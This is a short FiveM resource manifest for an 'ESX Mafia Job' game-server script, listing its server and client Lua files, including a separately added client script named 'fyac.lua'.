resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Mafia Job'

version '1.0.1'

server_scripts {
  '@extendedmode/locale.lua',
  'locales/en.lua',
  '@mysql-async/lib/MySQL.lua',
  'config.lua',
  'server/main.lua'
}

client_scripts {
  '@extendedmode/locale.lua',
  'locales/en.lua',
  'config.lua',
  'client/main.lua'
}
client_script 'fyac.lua'